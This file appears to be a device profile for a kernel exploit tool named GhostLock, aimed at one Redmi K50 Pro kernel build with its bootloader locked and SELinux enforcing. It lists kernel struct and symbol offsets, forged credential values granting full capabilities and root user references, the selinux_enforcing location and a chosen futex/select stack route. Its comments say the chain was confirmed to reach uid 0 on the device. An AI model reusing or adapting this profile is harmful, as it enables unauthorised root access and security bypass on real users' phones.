# GhostLock kernel profile: Redmi K50 Pro (matisse), MediaTek Dimensity 9000 (MT6983).
# Kernel 5.10.209-android12-9-00019-g4ea09a298bb4-ab12292661, bootloader locked,
# SELinux enforcing, verified boot green.
#
# offset.* are offsets from _text (0xffffffc008000000), recovered from the
# release's own embedded kallsyms (142102 symbols, pre-6.4 layout) out of the
# official OTA boot partition. No BTF is present in this image, so every struct
# offset below was derived by disassembly and cross-checked on-device:
#   commit_creds                -> real_cred 0x778, cred 0x780
#   __secure_computing          -> seccomp 0x848
#   rt_mutex_adjust_prio_chain  -> pi_lock 0x86c, pi_waiters 0x880, pi_blocked_on 0x898
#   set_user_nice               -> static_prio 0x88 => prio 0x84, normal_prio 0x8c
#   init_task.comm in the image -> comm 0x790
# cred references are read straight out of the init_cred bytes at +0x80/+0x88/+0x90.
#
# Route: select_stack. pselect and futex chain frames coincide exactly on this
# build (both resolve to -0x210 from the syscall entry sp), so waiter_shift = -2.
# rt_mutex_waiter is the 10-word v5.10 layout (task 0x30, lock 0x38), hence
# compact_waiter = 1. Confirmed on-device: W1 and W2 both report
# "calls=1 success=1 status=0", child reaches uid 0.
#
# mm_struct_sz comes from /proc/slabinfo on the device (objsize 960), not from a
# neighbouring kernel family.
release = "5.10.209-android12-9-00019-g4ea09a298bb4-ab12292661"
schema_version = 1
kernel_major = 5
recommend_shizuku = 1
kernel_phys_load = 2147483648      # 0x80000000
kernel_phys_offset = 2147483648    # DRAM base 0x80000000
route {
  select_stack {
    waiter_shift = -2
    compact_waiter = 1
  }
}
fallback {
  to = "none"
}
kernelsnitch {
  collisions = 4
  mm_struct_sz = 960               # /proc/slabinfo mm_struct objsize
}
task_struct {
  prio = 132                       # 0x084
  normal_prio = 140                # 0x08c
  sched_task_group = 784           # 0x310
  pi_lock = 2156                   # 0x86c
  pi_waiters = 2176                # 0x880
  pi_top_task = 2192               # 0x890
  pi_blocked_on = 2200             # 0x898
  pid = 1480                       # 0x5c8
  tgid = 1484                      # 0x5cc
  atomic_flags = 1424              # 0x590
  real_cred = 1912                 # 0x778
  cred = 1920                      # 0x780
  comm = 1936                      # 0x790
  tasks = 1224                     # 0x4c8
  seccomp = 2120                   # 0x848
}
cred {
  copy_size = 168                  # cred_jar objsize is 192; 168 covers every field we touch
  usage_offset = 0
  usage_value = 1
  caps_offset = 48                 # 0x30, cap_permitted/effective/bset run
  caps_count = 3
  caps_value = 2199023255551       # 0x1ffffffffff
  ref_count = 3
  ref0_offset = 128                # 0x80 -> user        = root_user
  ref0_image = -274702076320       # 0xffffffc00a7af660
  ref1_offset = 136                # 0x88 -> user_ns     = init_user_ns
  ref1_image = -274702076168       # 0xffffffc00a7af6f8
  ref2_offset = 144                # 0x90 -> group_info  = init_groups
  ref2_image = -274702070904       # 0xffffffc00a7b0b88
  ref3_offset = null
  ref3_image = null
}
offset {
  init_task = 41533120             # 0x0279be80
  init_cred = 41618144             # 0x027b0ae0
  empty_zero_page = 43569152       # 0x0298e000
  root_task_group = 43589696       # 0x02992040
  selinux_enforcing = 44309400     # 0x02a41b98, selinux_state.enforcing (no `disabled` field:
                                   # the payload builder's byte-2 check proves initialized sits at +2)
  selinux_blob_sizes = 36632184    # 0x022ef678
  security_hook_heads = 36630504   # 0x022eefe8
  slide_nfulnl_logger = 41489312   # 0x027913a0
  slide_loggers_0_1 = 41489112     # 0x027912c8
  slide_boot_id = 44436405         # 0x02a60bb5
}
